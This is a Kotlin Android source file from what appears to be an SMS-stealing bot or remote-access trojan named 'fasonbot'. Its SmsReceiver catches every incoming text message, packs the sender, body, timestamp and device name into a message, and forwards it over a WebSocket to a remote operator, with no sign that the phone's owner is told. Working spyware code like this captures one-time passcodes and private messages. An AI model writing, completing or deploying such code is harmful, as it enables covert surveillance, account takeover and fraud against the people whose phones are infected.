package com.fasonbot.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import com.fasonbot.app.config.BotConfig
import com.fasonbot.app.util.PermissionHelper
import com.fasonbot.app.ws.WebSocketSender
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return
        if (!PermissionHelper.hasReadSms(context)) return

        val bundle = intent.extras ?: return
        try {
            @Suppress("DEPRECATION")
            val pdus = bundle.get("pdus") as? Array<*> ?: return
            val format = bundle.getString("format") ?: "3gpp"
            val dateFormat = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault())

            for (pdu in pdus) {
                try {
                    val msg = SmsMessage.createFromPdu(pdu as ByteArray, format)
                    val from = msg.originatingAddress ?: "Unknown"
                    val body = msg.messageBody ?: ""
                    val time = dateFormat.format(Date(msg.timestampMillis))

                    val text = buildString {
                        append("📱 New SMS Received\n\n")
                        append("From: $from\n")
                        append("Device: ${BotConfig.getDeviceName()}\n")
                        append("Time: $time\n\n")
                        append("Message:\n$body")
                    }

                    WebSocketSender.sendText(text)
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing SMS: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "SmsReceiver error: ${e.message}")
        }
    }
}
